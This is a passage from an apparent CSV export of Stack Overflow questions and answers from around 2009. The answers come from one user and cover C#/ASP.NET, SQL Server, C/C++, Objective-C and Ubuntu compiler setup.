                path = HttpContext.Current.Server.MapPath(""~/""+recipient+FileExtension);
                //FileExtension="".xml""
                //Null reference exception thrown from this line
            }
            catch (Exception e)
            {
                throw new Exception(""Trying to get path "" + e.Message);
            }
            try
            {
                xml_messages = XElement.Load(path);
            }
            catch
            {
                xml_messages = XElement.Parse(""&lt;nothing/&gt;"");
            }
            var element = (XElement) message;
            if (xml_messages.IsEmpty)
            {
                xml_messages =
                    new XElement(""messages"",
                                 new XAttribute(""recipient"", recipient),
                                 element
                        );  
            }
            else
            {
                xml_messages.Add(element);
            }
            xml_messages.Save(path);
        }
    }
</code></pre>

<p>However I am greeted by a null reference exception?! The exception is generated in the MapPath line. Help?</p>
","33708","","<p>Yes. You should specify a full path for the file. You can use </p>

<pre><code>System.Web.HttpContext.Current.Server.MapPath(""~/onno.xml"")
</code></pre>

<p>to get the full path of the file (if you want to write in the application directory). </p>

<p>Note that <code>HttpContext.Current</code> is unavailable to WCF services not running in <a href=""http://msdn.microsoft.com/en-us/library/aa702682.aspx"" rel=""nofollow"">ASP.NET compatibility mode</a>. You can enable ASP.NET compatibility mode with </p>

<pre><code>&lt;serviceHostingEnvironment aspNetCompatibilityEnabled=""true"" /&gt;
</code></pre>

<p>configuration option and <code>[AspNetCompatibilityRequirements(RequirementsMode = AspNetCompatibilityRequirementsMode.Required)]</code> attribute. However, this will limit your WCF service to ASP.NET environment. This is not a good thing.</p>

<p>Alternatively, you could use a configuration setting for the base path and use </p>

<pre><code>System.IO.Path.Combine(defaultPath, ""onno.xml"")
</code></pre>

<p>to get the full path. This solution is more flexible.</p>

<p>Also, NTFS write permission to that location should be granted to the user account under which the application pool is running.</p>
"
"<pre><code>SELECT 
	*
FROM 
	myTable
WHERE 
	field1 LIKE 'match0' AND
	myfunc(t1.hardwareConfig) LIKE 'match1'
</code></pre>

<p>Here is my question, </p>

<p>the matching of field1 is fast and quick, but myfunc takes forever to return and I want to make sure that if field1 doesn't match that it doesn't even attempt to do myfunc.</p>

<p>Will SQL just know this or can I make it explicit in my query?</p>

<p>I'm on MSSQL 2000, 2005 and 2008, hopefully there's a common answer.</p>
","33708","","<p><code>mysp</code> can't be a stored procedure. It has to be a user defined function (which you should have qualified with its schema name, by the way). A user defined function is restricted to be side-effect free and should adhere to some rules. Essentially, SQL Server will combine the query and execute it as a single module with a single execution plan. It's not procedural function calling as you might expect. SQL describes what to do, not how to do it and the query optimizer will generate a plan that responds to your complete query, not each part of it separately. The same is true for views.</p>
"
"<p>How can I change the port number used by WebBrowser control? The standard port number is 80, but I would like to use a different port.</p>
","33708","","<p>You should specify an alternate port number in the URL itself:</p>

<pre><code>http://server:port/path?query
</code></pre>
"
"<p>I am trying to display the images in my Asp.Net MVC 1.0 application.</p>

<p>I can successfully get the Image (into <code>byte[]</code>) from DB.</p>

<p>How can I display it into the <code>&lt;img&gt;</code>?</p>
","33708","","<p>Return a <a href=""http://msdn.microsoft.com/en-us/library/system.web.mvc.controller.file.aspx"" rel=""nofollow""><code>FileResult</code></a> from action method:</p>

<pre><code>return File(imageData, ""image/png"");
</code></pre>

<p>Note that outputting HTML of the page and the image should be done in two separate requests. You have to generate a URL for the <code>src</code> attribute to the action that returns the image and in that action, you can output the image contents.</p>
"
"<p>This is hurting my head. In a func i haave the code below. What is hurting my head is the fact i can se &amp;id= in my RawUrl and it the value it should hold meanwhile req[""id""] in the if statement returns null</p>

<pre><code>    var req = HttpContext.Current.Request;
    string u = req.RawUrl; // --&gt; /pstcm&amp;id=5653999025705172077
    d = null;
    if (req[""id""] != null)
</code></pre>
","33708","","<p>As far as I can see, the <code>id=...</code> is not specified as a querystring attribute. There's no <code>?</code> before it. It's part of the URL path itself. The indexer of <code>HttpRequest</code> will only consider cookies, form values, querystring attributes, and server variables. Obviously, it cannot magically infer any arbitrarily defined format.</p>
"
"<p>i got 3 syntax errors:</p>

<p>""syntax error before ""}"" token""
my code was</p>

<pre><code>IBOutlet UITextView *fruitDescription
}
</code></pre>

<p>""syntax error before ""{"" token""
my code was </p>

<pre><code>- (void)viewDidUnload {
</code></pre>

<p>""syntax error before ""{"" token""
my code was </p>

<pre><code>- (void)dealloc {
</code></pre>

<p>Any ideas?</p>
","33708","","<p>There should be a semicolon after</p>

<pre><code>IBOutlet UITextView *fruitDescription
</code></pre>

<p>Always try to fix the first error message you see first and recompile. Subsequent errors can go away by fixing the first one.</p>
"
"<p>hey guys, <br />
Lately, I'v been struggling with an annoying situation on ASP.NET MVC. Here's the story in short, <br />
I'm supposed to have a view that lists all of the products; now because those products are too many, I'm paging them (very innovative heh!). The page contains two paging arrows -""Next 10 products"", ""and previous 10 products"". The view is passed a <code>IEnumerable&lt;Product&gt;</code> collection containing the list of products to be displayed. The view is also passed two integers (currentPage, totalPages) as ViewData items. Now what I need to accomplish is to check if it's the first page (ViewData[""CurrentPage""] == 0) I should change the css class of the ""previous 10 pages"" link to disabled, so I came up with something like the following <br />  <br />           </p>

<pre><code> &lt;a href=""/Products/Page&lt;%=Html.Encode(Convert.ToInt32(ViewData[""CurrentPage""])-1)%&gt;/"" 
           class=""&lt;%=Convert.ToInt32(ViewData[""CurrentPage""]) &lt;= 1 ? ""bgn disabled"" : """"%&gt;""&gt;                          
                previous 10 products                
        &lt;/a&gt;
</code></pre>

<p>This worked fine, still there's a problem. Though the link is disabled, or specifically grayed, it still points to a valid URL, so I tried to actually change the href attribute of the link based on the CurrentPage variable. Here's how the code looks like (get ready to the pure ugliness): <br /><br /></p>

<pre><code>&lt;a href=""&lt;%=Convert.ToInt32(ViewData[""CurrentPage""]) &lt;= 0 ? 
        ""javascript:void[]"" : 
        ""/products/Page&lt;%=Html.Encode(Convert.ToInt32(ViewData[""CurrentPage""])+1)%&gt;/"" %&gt;"" 
        class=""&lt;%=Convert.ToInt32(ViewData[""CurrentPage""]) &lt;= 0 ? 
        ""bgn disabled"" :
        """"%&gt;""&gt;

    previous 10 products
    &lt;/a&gt;
</code></pre>

<p>Now, my problems with this code are: <br /></p>

<ol>
<li>The second statement doesn't work, apparently because of the nested server side scripts</li>
<li>It's very ugly, and absolutely unreadable (imagine I'm doing this with each page that requires paging! pain in the but). :( </li>
</ol>

<p>Any better alternatives guys?</p>
","33708","","<p>You can use an <code>if</code> statement:</p>

<pre><code>&lt;% if (Convert.ToInt32(ViewData[""CurrentPage""]) &lt;= 0) { %&gt;
     Disabled template goes here...
&lt;% } else { %&gt; 
     Link template goes here...
&lt;% } %&gt;
</code></pre>

<p>By the way, if you're doing this for a set of pages, you can encapsulate it in a <code>ViewUserControl</code> or a <code>ViewMasterPage</code>.</p>
"
"<p>I recently saw some Clojure or Scala (sorry I'm not familiar with them) and they did zip on a list or something like that. What is zip and where did it come from ?</p>
","33708","","<p>Pavel's answer pretty much describes it. I'll just provide an F# example:</p>

<pre><code>let x = [1;2]
let y = [""hello""; ""world""]
let z = Seq.zip x y
</code></pre>

<p>The value of <code>z</code> will be a sequence containing tuples of items in the same position from the two sequences:</p>

<pre><code>[(1, ""hello""); (2, ""world"")]
</code></pre>
"
"<p>With Windows 7 due to be released at the end of 2009, what changes should we expect? What impact will Windows 7 have on the industry? Are we still going to be using .NET (3.5?) to program Windows? Where does 64-bit figure in all this?</p>

<p>We'll definitely be able to use Java for 64-bit stuff, but how is Microsoft going to have us making native 64-bit Windows applications?</p>
","33708","","<p>.NET Framework has supported native 64 bit JIT for a <strong>long time</strong>. You can take advantage of it just by running your .NET binaries on an x64 system (unless they are explicitly marked as x86 only).</p>
"
"<p>I'm looking to do a website for a client and I am considering using ASP.NET. Can I use the express version of Visual Studio to build this or do I have to buy a license?</p>
","33708","","<p>Yes, Visual Web Developer 2008 SP1 Express is a great development platform. It does <em>most</em> of the stuff needed for professional development, let alone developing as hobbyist.</p>
"
"<p>In my application, _collection is a List from which I need to <strong>remove all User objects</strong> which do not match the <strong>criteria</strong>.</p>

<p>However, the following code gets an <strong>invalid operation</strong> error in its second iteration since the _collection itself has been changed:</p>

<pre><code>foreach (User user in _collection)
{
    if (!user.IsApproved())
    {
        _collection.Remove(user);
    }
}
</code></pre>

<p>I could create another List collection and copy them back and forth but then I have the issue of non-cloned reference types, etc.</p>

<p><strong>Is there a way to do the above more elegantly than copying _collection to another  another List variable?</strong></p>
","33708","","<pre><code>_collection.RemoveAll(user =&gt; !user.IsApproved());
</code></pre>

<p>If you're <em>still</em> on 2.0:</p>

<pre><code>_collection.RemoveAll(delegate(User u) { return !u.IsApproved(); });
</code></pre>

<p>By the way, if you don't want to touch the original list, you can get <em>another</em> list of approved users with:</p>

<pre><code>_collection.FindAll(user =&gt; user.IsApproved());
</code></pre>
"
"<p>I was looking through the DXUTCore project that comes with the DirectX March 2009 SDK, and noticed that instead of making normal accessor methods, they used macros to create the generic accessors, similar to the following:</p>

<pre><code>#define GET_ACCESSOR( x, y )  inline x Get##y()  { DXUTLock l; return m_state.m_##y;};
...

GET_ACCESSOR( WCHAR*, WindowTitle );
</code></pre>

<p>It seems that the ## operator just inserts the text from the second argument into the macro to create a function operating on a variable using that text.  Is this something that is standard in C++ (i.e. not Microsoft specific)? Is its use considered good practice? And, what is that operator called?</p>
","33708","","<p>It's a preprocessing operator that concatenates left and right operands (without inserting whitespace). I don't think it's Microsoft specific.</p>
"
"<p>I am writing a Tiger compiler in F# and I have decided to emit x86 assembly. I know the basics of how a machine is constructed and also a bit of assembly, but not enough to write a good compiler back-end.</p>

<p>What resources can you recommend for learning what I need to know?</p>

<p>Where can I look up information such as calling conventions, etc.?</p>

<p>My plan is to get an inefficient back-end working correctly and then gradually improve it.
For the first version I am looking for information about the subset of instructions and registers which I will actually need for a rudimentary back-end. Some kind of tutorial might be nice.</p>
","33708","","<p>For x86 and x64 assembly, I suggest the ultimate reference:</p>

<p><a href=""http://www.intel.com/products/processor/manuals/"" rel=""nofollow"">IntelÂ® 64 and IA-32 Architectures Software Developer's Manuals</a></p>

<p>For calling conventions, system calls, etc., you should also consult documents for the OS you're building on.</p>
"
"<p>For any arbitrary instance (collections of different objects, compositions, single objects, etc)</p>

<p>How can I determine its size in bytes?</p>

<p>(I've currently got a collection of various objects and i'm trying to determine the aggregated size of it)</p>

<p>EDIT:  Has someone written an extension method for Object that could do this?  That'd be pretty neat imo.</p>
","33708","","<p>For value types, you can use <a href=""http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.sizeof.aspx"" rel=""nofollow""><code>Marshal.SizeOf</code></a>. Of course, it returns the number of bytes required to marshal the structure in unmanaged memory, which is not necessarily what the CLR uses.</p>
"
"<p>I want to implement architecture involving different .NET assemblies (i.e. modules). Some of these modules should provide services which are used as .NET interfaces by other modules.
The modules should be loaded and registered dynamically at runtime, I do not want to have ""hardcoded"" dependencies between them.</p>

<p>Example:</p>

<pre>
  Module1.dll:
    Defines a class implementing interface IService1
  Module2.dll:
    Uses the class provided by Module1 through the interface IService1 
</pre>

<p>The problem is where to put the definition of <code>IService1</code>: Both modules need this definition. But since <code>Module2</code> should also work in absence of <code>Module1</code> (the availability of the service is checked at runtime) I don't want <code>Module2.dll</code>  to reference <code>Module1.dll</code> directly.</p>

<p>One possibility is to split every module into two assemblies (interface and definition), but that would mean that I double the number of DLLs which I do not want.</p>

<p>I thought also of using a separate ""Interface Dll"" i.e. one single assembly containing all interface definitions, but then again, if I change one single interface or if I add new modules (with new iterfaces), I need to update this central DLL and therefore all other modules (since they all depend on it...)</p>

<p>What I would like is to link the interface definition into both <code>Module1</code> and <code>Module2</code>, but I do not know if resp. how this is possible.</p>

<p>I'd appreciate any ideas</p>

<p><strong>Edit</strong>
Perhaps the example was a bit too simple: There could be a scenario where <code>Module1a.dll</code>, <code>Module1b.dll</code> etc. provide implementations for <code>IService</code> and <code>Module2a.dll</code>, <code>Module2b.dll</code> etc. are using them...</p>
","33708","","<p><code>Module2.dll</code> should declare <code>IService</code> and <code>Module1.dll</code> should reference <code>Module2.dll</code>. Then, <code>Module2.dll</code> should use reflection (perhaps with a configuration setting) to create the type declared in <code>Module1.dll</code> and cast it to <code>IService</code>:</p>

<pre><code>// in module2.dll
var serviceInstance = (IService)Activator.CreateInstance(typeToLoad);
</code></pre>
"
"<p>I have inherited a database where there are clustered indexes and additional duplicate indexes for each of the clustered index.</p>

<p>i.e
IX_PrimaryKey is a clustered index on the column ID.
IX_ID is a non clustered index on the column ID.</p>

<p>I want to clean up these duplicate non clustered indexes and I wanted to check to see if anyone could think of a reason to do this.</p>

<p>Can anyone think of a performance benefit for doing this?</p>
","33708","","<p>For exact same indexes, there's no performance gain. Actually, it incurs <strong>performance loss in insertion and updates</strong>. However, if there are multicolumn indexes with different column order, there might be a valid reason for them.</p>
"
"<p>C++ does not allow polymorphism for methods based on their return type. However, when overloading an implicit conversion member function this seems possible.</p>

<p>Does anyone know why? I thought operators are handled like methods internally.</p>

<p>Edit: Here's an example:</p>

<pre><code>struct func {
    operator string() { return ""1"";}
    operator int() { return 2; }
};

int main( ) {
    int x    = func(); // calls int version
    string y = func(); // calls string version
    double d = func(); // calls int version
    cout &lt;&lt; func() &lt;&lt; endl; // calls int version
}
</code></pre>
","33708","","<p>Conversion operators are not really considered different overloads and they are not called based on <em>their return type</em>. The compiler will only use them when it <strong>has to</strong> (when the type is incompatible and should be converted) or when explicitly asked to use one of them with a cast operator.</p>

<p>Semantically, what your code is doing is to declare several <strong>different</strong> type conversion operators and <strong>not overloads of a single operator</strong>.</p>
"
"<p>For any of the common ""asp:<strong>______</strong>"" controls (asp:gridview, asp:repeater, etc) I always add runat=""server"".  Is there any good reason that Intellisense shouldn't insert this automatically?</p>
","33708","","<p>What if you really wanted to output something like <code>&lt;asp:xyz&gt;</code>? For example, if you wanted to generate an XML document with namespaces, you might want to use that template without any <code>runat=""server""</code>, like:</p>

<pre><code>&lt;root xmlns=""..."" xmlns:asp=""...""&gt;
   &lt;asp:GridView&gt;
       &lt;name&gt;&lt;%= Request[""name""] %&gt;&lt;/name&gt;
   &lt;/asp:GridView&gt;
&lt;/root&gt;
</code></pre>

<p>While I agree this might not be the common case, it's at least a good reason to require <code>runat=""server""</code> in the first place rather than just assuming it. However, it's not always very clear where you want to specify it and where you don't want. Note that there are <code>HtmlControls</code> too. Moreover, you can define your own prefixes too. That said, I personally think VS IntelliSense system is designed not to interfere with normal typing. That is, it never works like ""I think you need it most of the time. In the 1% of cases you didn't, manually remove it."" </p>
"
"<p>I'm using aspnet_compiler.exe to precompile my application for deployment.</p>

<p>However, I don't think it's working, for two reasons:</p>

<ul>
<li>I see my applications assemblies under C:\Windows\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files, even if i manually clear out this directory &amp; restart the app.</li>
<li>The performance hit to JIT the application is present. This is very specifically what I'd like to avoid, even though it is 'one time'.</li>
</ul>

<p>Here's specifically what I'm doing:</p>

<ol>
<li>Build the solution in studio.</li>
<li>execute aspnet_compiler.exe -v /Foo -p c:\builddir c:\deploydir (where Foo is the vdir my app runs under, c:\builddir is where studio builds to, and c:\deploydir is the location where </li>
<li>I then copy c:\deploydir to the web server.</li>
<li>I access <a href=""http://localhost/Foo"" rel=""nofollow"">http://localhost/Foo</a></li>
<li>After 30 seconds, the app displays, and I can see that assemblies have been generated in Temporary ASP.NET Files.</li>
</ol>

<p>If it's notable, I'm using .net 3.5 SP1/Studio 2008 SP1. compilation debug=false is also set in web.config.</p>
","33708","","<p>Your two points are moot:</p>

<ol>
<li><p>ASP.NET precompilation doesn't result in native image generation so JIT overhead will still be there. There might be a worker process creation overhead too.</p></li>
<li><p>ASP.NET precompilation has the option to compile everything (incl. ASPX stuff, ...) or just source code (which you can specify with the <code>-u</code> switch). In case of the latter, those assemblies will still be generated for ASPX files. In case of the former, what you are seeing is not assembly generation. The runtime just copies and caches the assemblies in <code>/bin</code> in <code>Temporary ASP.NET Files</code>. You can confirm this fact by comparing the assemblies byte by byte and see that they are identical.</p></li>
</ol>
"
"<p>How i can develop and compile command line C++ programs in my Linux Ubuntu, for my Jornada 720 that have a Windows CE 3.1(HPC 2000), something like a compiler like that for Palm or something like <em>gcc</em>, and a tutorial of development and compiling will be very nice, remember that i want to build command line programs to Windows CE, programs that runs under the <em>cmd</em> of the Windows CE. Thanks!</p>
","33708","","<p>Try <a href=""http://gizguides.wikidot.com/linuxcegcc"" rel=""nofollow"">CeGcc</a>.</p>
"
"<p>I've got a solid book on learning <a href=""http://www.sitepoint.com/books/aspnet2/"" rel=""nofollow"">ASP.net 2.0 with VB &amp; C#</a> - my concern is whether I should push forward with this or pick up the newest edition which covers ASP.net 3.5.  </p>

<p>Basically, I'm writing a contact-management style web app for my church, and I really want to use ASP.net.  I'm willing to invest in the 3.5 book, if it's going to be different enough, otherwise, I can utilize the 2.0 and just learn the hard way for the 3.5 changes.</p>

<p>Currently I'm using VWD 2008 and am focusing on the C# language. I've been a full-time PHP programmer now for 5 years with tons of HTML, CSS &amp; Javascript / AJAX experience building web-apps for my day job.  I used C++ and VB 6.0 for about 2 years back around 2003/2004, so I'm familiar with the Microsoft style.  Just haven't utilized it really since .net became the norm.</p>

<p>So should I grab the latest edition or use what I've got?  In the end, if the 3.5 book will save me a decent amount of time and/or hassle, I'll just hold out and get that.</p>

<p>Thoughts?</p>
","33708","","<p>There's no fundamental change to ASP.NET <strong>engine</strong> in version 3.5 in contrast to 2.0. There are some new server controls. The primary applicable change is the new versions of C# and VB.NET compiler and libraries (with LINQ at the forefront).</p>

<p>Any decent ASP.NET 3.5 book should cover most of the stuff in 2.0 and new additions. If you're an expert in 2.0, you might learn better just by experimenting things. Otherwise, spending a little on a book will considerably save your time.</p>
"
"<p>I need to know if there's any way (or another distinct approach) to an attribute knows something about what is being decorated for him. For example:</p>

<pre><code>class Cat
{
    public Cat() { }

    [MyAttribute]
    public House House { get; set; }
}
</code></pre>

<p>Inside <code>MyAttribute</code> I must do some preprocessing with the house object...</p>

<pre><code>class MyAttribute : Attribute
{
    public MyAttribute() 
    {
        var ob = // Discover the decorated property, do some changes and set it again
    }
}
</code></pre>

<p>I don't know if it's the better way, neither if it actually can be done, </p>
","33708","","<p>This is not how attributes work. They are just compile time metadata added to something. They don't accomplish anything by themselves. At runtime, code can use that metadata to do things.</p>

<p><strong>UPDATE:</strong> Basically, as I understand, you are trying to accomplish two things. The first is to tell the repository not to load some properties. Attributes can be used for this purpose but the repository code should use reflection on the entity type and see what it shouldn't load in the first place. The second thing is that you want to have the property loaded as it's called for the first time. You need to check if it's already loaded or not on each call and load it the first time it's called. This can be achieved by manually inserting such a code or using something like <a href=""http://www.postsharp.org/"" rel=""nofollow"">PostSharp</a> which post-processes code and can inject method calls automatically by looking at the attributes. Probably, this is what you asked for in the first place.</p>
"
"<p>I can't get the code below to compile (see errors). Advice on correction would be appreciated.</p>

<pre><code>#include &lt;stdio.h&gt;

typedef struct {
  char    *fldName;
  unsigned fldLen;
} Field;

typedef struct {
  char    *fldPrompt;
  unsigned startRow;
  unsigned startCol;
} Prompt;

typedef struct {
  Field   *fields[];
  Prompt  *prompts[];
  unsigned numFlds;  &lt;&lt;&lt; invalid field declaration after empty field 
} Form;                    &lt;&lt;&lt; in '(incomplete) struct (no name)'.

Field  firstName = { ""fName"", 12 };
Field  surName   = { ""sName"", 25 };
Field  gender    = { ""gder"", 1 };

Prompt fn        = { ""First Name : "", 4, 10 };
Prompt sn        = { ""Surname    : "", 6, 10 };
Prompt gn        = { ""Gender     : "", 8, 10 };

int main (void)
{
  Form aForm = { { &amp;firstName, &amp;surName, &amp;gender },
                 { &amp;fn, &amp;sn, &amp;gn}, 
                 3 };  &lt;&lt;&lt;  Multiple initializers for the same element
  return 0;             &lt;&lt;&lt;  Too many initializers
}
</code></pre>
","33708","","<p>You have declared arrays in the <code>struct</code> definition without specifying the bounds. This is not possible:</p>

<pre><code>typedef struct {
    Field   *fields[];
    Prompt  *prompts[];
    unsigned numFlds; 
} Form;
</code></pre>

<p>You should either specify a number in the brackets or change it to a pointer type instead: <code>Field **fields;</code>. Always note that size of a structure is static and is known at compile time, thus, it can't have variable sized array inside itself. However, it can point to a variable sized array (as pointers have a constant size).</p>
"
"<p>Suppose I have two tables that are linked (one has a foreign key to the other) :</p>

<pre><code>CREATE TABLE Document (
  Id INT PRIMARY KEY,
  Name VARCHAR 255
)

CREATE TABLE DocumentStats (
  Id INT PRIMARY KEY,
  DocumentId INT, -- this is a foreign key to table Document
  NbViews INT
)
</code></pre>

<p>I know, this is not the smartest way of doing things, but this is the best example I could come up with.</p>

<p>Now, I want to get all documents that have more than 500 views. The two solutions that come to my mind are :</p>

<pre><code>SELECT *
FROM Document, DocumentStats
WHERE DocumentStats.Id = Document.Id
  AND DocumentStats.NbViews &gt; 500
</code></pre>

<p>or :</p>

<pre><code>SELECT *
FROM Document
INNER JOIN DocumentStats
ON Document.Id = DocumentStats.Id
WHERE DocumentStats.NbViews &gt; 500
</code></pre>

<p>Are both queries equivalent, or is there one way that is far better than the other ? If so, why ?</p>

<p>I'm aware that my example is not perfect, and that the queries may need some tune-up, but I hope you got the point ;) !</p>

<p>EDIT: as requested in the answers, this question was aimed at MSSQL, but I would be interested in knowing if it is different for other DB engines (MySQL, etc...)</p>
","33708","","<p>Theoretically, no, it shouldn't be any faster. The query optimizer should be able to generate an identical execution plan. However, some DB engines can produce better execution plans for one of them (not likely to happen for such a simple query but for complex enough ones). You should test both and see (on your DB engine).</p>
"
"<p>I <a href=""http://en.wikipedia.org/wiki/Splint%5F%28programming%5Ftool%29"" rel=""nofollow"">found</a> this piece of code on Wikipedia. </p>

<pre><code>#include &lt;stdio.h&gt;

int main(void)
{
  int c;

  while (c = getchar(), c != EOF &amp;&amp; c != 'x')
  {
    switch (c)
      {
      case '\n':
      case '\r':
        printf (""Newline\n"");
        break;
      default:
        printf (""%c"",c);
      }
  }
  return 0;
}
</code></pre>

<p>I'm curious about expression used as condition for while loop: </p>

<pre><code>while (c = getchar(), c != EOF &amp;&amp; c != 'x')
</code></pre>

<p>It's quite obvious what it does, but I've never seen this construction before. Is this specific to <strong>while</strong> loop? If not, how does parser/compiler determine which side of comma-separated expression returns boolean value for <strong>while</strong> loop?</p>
","33708","","<p>The <em>comma</em> is an operator. It returns the value of the right hand expression <strong>by default</strong>. The order of evaluation is guaranteed to be left first and then right.</p>

<h3>UPDATE (reply to Pax's comment):</h3>

<p>Just like most operators, it can be overloaded for user defined types:</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;string&gt;
using namespace std;

enum EntryType { Home, Cell, Address };

class AddressBookEntryReference {
public:
    AddressBookEntryReference(const string&amp; name, const EntryType &amp;entry)
    	: Name(name), Entry(entry) { }
    string Name;
    EntryType Entry;
};

AddressBookEntryReference operator,(const string&amp; name, const EntryType &amp;type) {
    return AddressBookEntryReference(name, type);
}

class AddressBook {
    string test;
public:
    string&amp; operator[](const AddressBookEntryReference item) {
    	// return something based on item.Name and item.Entry.

    	// just to test:
    	test = item.Name;
    	return test;
    }
};

int main() {
    // demo:
    AddressBook book;
    cout &lt;&lt; book[""Name"", Cell]  // cool syntax! 
         &lt;&lt; endl;
}
</code></pre>
"
"<p>I want to toggle a button's visibility in when value of a particular variable changes. Is there a way to attach some kind of delegate to a variable which executes automatically when value changes?</p>
","33708","","<p>No, you can't do things like overloading assignment operator in C#. The best you could do is to change the variable to a property and call a method or delegate or raise an event in its setter.</p>

<pre><code>private string field;
public string Field {
   get { return field; }
   set { 
       if (field != value) {
           field = value;
           Notify();
       } 
   }
}
</code></pre>

<p>This is done by many frameworks (like WPF <code>DependencyProperty</code> system) to track property changes.</p>
"
"<p>Is there any way in <strong>C#</strong> to pass a <strong>random</strong> method as a parameter?</p>

<p>To explain my question:</p>

<p>I want to write a simple Logger-Tool that reports the entering and leaving of a method <strong>with</strong> the passed arguments an the class and method name:</p>

<p><strong>The log file I'm aiming at:</strong></p>

<pre><code>ENTERING: ClassOfDoom::MethodOfDoom( arg1={1} [int], arg2={true} [bool] )
LEAVING: ClassOfDoom::MethodOfDoom RETURNING 1 [int]
</code></pre>

<p><strong>The code I have in mind:</strong></p>

<pre><code>class ClassOfDoom {
  // Remeber: MethodOfDoom is a _random_ method with _random_ arguments
  public int MethodOfDoom(int arg1, bool arg2) {
    Log.Entering(this, this.MethodOfDoom, arg1, arg2);
    ...
    return Log.Returing(this, this.MethodOfDoom, 1);
  }
}
</code></pre>

<p>Is there a way to achieve this? Or isn't <strong>C#</strong> as flexible as that?</p>

<p>Thanks in advance!</p>
","33708","","<p>You can make your logging function take a <code>MethodBase</code> argument and use <a href=""http://msdn.microsoft.com/en-us/library/system.reflection.methodbase.getcurrentmethod.aspx"" rel=""nofollow"">MethodBase.GetCurrentMethod</a> to pass the current method info as an argument.</p>

<p>Then, in the logger, you could check its properties <code>Name</code> and <code>DeclaringType</code> to get the method information. Also, passing parameters is easy by declaring a <code>params object[] args</code> parameter in the logging function:</p>

<pre><code>public static void Entering(object obj, MethodBase methodInfo,
                            params object[] args) {
    Console.WriteLine(""ENTERING {0}:{1}"", methodInfo.DeclaringType.Name,
                                          methodInfo.Name);
    ...
}
</code></pre>
"
"<p>How can one access cache objects in handler class? </p>

<pre><code>public void ProcessRequest (HttpContext context) {
    //Cache[""asd""] = ""asd"";
    //context.Response[""1""]=""sfd"";
    context.Response.ContentType = ""text/plain"";
    context.Response.Write(""Hello World"");
    string ss=(string)context.Cache[""aasd""];
    string sss=(string)context.Session[""sdf""];
}
</code></pre>
","33708","","<p><code>context.Cache</code> should work. To use <code>context.Session</code> you should mark the handler to require session state by implementing the <code>IRequiresSessionState</code> marker interface.</p>
"
"<p>There are two ways to read data from RichTextBox line by line</p>

<p>1 ) use a for loop to loop through lines of a richtextBox</p>

<pre><code>String s=String.Empty;
for(int i=0;i&lt;richtextbox.lines.length;i++)
 {
     s=richTextBox.Lines[i]
 }
</code></pre>

<p>2 ) use a foreach loop to enumerate richTextBox.Lines collection</p>

<pre><code>   String s=String.Empty;
   foreach(string str in txtText.Lines)
    {
       s=str;
    }
</code></pre>

<p>There is a huge difference in performance when we use foreach loop to enumerate array collection for richtextbox.</p>

<p>I tried with 15000 lines.for loop took 8 minutes to just loop down to 15000 lines.while foreach took fraction of a second to enumerate it. </p>

<p>Why is this behaviour there?</p>
","33708","","<p>I think the <code>Lines</code> property is recalculated every time you want to access it. Consequently, the <code>foreach</code> method performs the calculation only once, while every time your reference <code>Lines[i]</code> it's re-evaluating the whole thing. Try caching the result of <code>Lines</code> property and checking again:</p>

<pre><code>String s = String.Empty;
var lines = richtextbox.Lines;
for(int i = 0; i &lt; lines.Length; i++)
{
    s = lines[i];
}
</code></pre>

<p>By the way, your question makes an implicit assumption that <code>foreach</code> is always slower than <code>for</code>. This is not always true.</p>
"
"<p>I've found this snippet of code on the net. It sets up an NSMutableArray in a way I've not seen before ( I'm an Obj-C newb). Can someone explain what it's doing and why you would do it this way? Particularly the @syncronized, static and little plus sign on the method signature.</p>

<pre><code>add the following to the .h file:
+(NSMutableArray *)allMySprites;

add the following to he .m file after implementation:

static NSMutableArray * allMySprites = nil;

+(NSMutableArray *)allMySprites {
    @synchronized(allMySprites) {
        if (allMySprites == nil)
            allMySprites = [[NSMutableArray alloc] init];
        return allMySprites;
    }
 return nil;
</code></pre>

<p>}</p>
","33708","","<p>The <code>+</code> sign indicates the method is <code>static</code> as opposed to <code>instance</code> methods. It means the method belongs to the class rather than each instance of a class (just like <a href=""http://stackoverflow.com/questions/413898/what-does-the-static-keyword-do-in-java/413904#413904""><code>static</code> things in Java and C#</a>). <code>@synchronized</code> acquires a lock on the object specified (<a href=""http://msdn.microsoft.com/en-us/library/c5kehkcz%28VS.80%29.aspx"" rel=""nofollow"">like <code>lock</code> statement in C#</a>). It means no other thread can enter a <code>@synchronized</code> block with that object. </p>

<p>The code as a whole is trying to initialize a singleton collection the first time (when it's not initialized yet) and cache it for use in subsequent calls to that method. The synchronized block creates a <a href=""http://en.wikipedia.org/wiki/Critical%5Fsection"" rel=""nofollow"">critical section</a> to make the initialization part safe in case of a race condition where two threads try to get the value roughly the same time while it's still doing the initialization.</p>
"
"<p>I have question regarding the use of function parameters.</p>

<p>In the past I have always written my code such that all information needed by a function is passed in as a parameter. I.e. global parameters are not used.</p>

<p>However through looking over other peoples code, functions without parameters seem to be the norm. I should note that these are for private functions of a class and that the values that would have been passed in as paramaters are in fact private member variables for that class.</p>

<p>This leads to neater looking code and im starting to lean towards this for private functions but would like other peoples views.</p>

<p>E.g.  </p>

<pre><code>Start();  
Process();  
Stop();
</code></pre>

<p>is neater and more readable than:  </p>

<pre><code>ParamD = Start(paramA, ParamB, ParamC);  
Process(ParamA, ParamD);  
Stop(ParamC);
</code></pre>

<p>It does break encapsulation from a method point of view but not from a class point of view.</p>
","33708","","<p>As you mentioned, there's a trade-off between them. There's no hard rule for always preferring one to another. Minimizing the scope of variables will keep their side effect local, the code more modular and reusable and debugging easier. However, it can be an overkill in some cases. If you keep your classes small (which you should do) then the shared variable would generally make sense. However, there can be other issues such as thread safety that might affect your choice.</p>
"
"<p>I'm using Linux Ubuntu Intrepid Ibex and using as compiler the <em>gcc</em>, but when I try to compile a C++ project file, the compiler give me this error:</p>

<pre><code>ubuntu@ubuntu-laptop:~/C++$ gcc ClientFile.cpp
gcc: error trying to exec 'cc1plus': execvp: No such file or directory
</code></pre>

<p>What is wrong?</p>
","33708","","<p>Do you have the build suite installed?</p>

<pre><code>sudo apt-get --reinstall install build-essential
</code></pre>

<p>and compile C++ code with <code>g++</code> command, not <code>gcc</code>.</p>
"
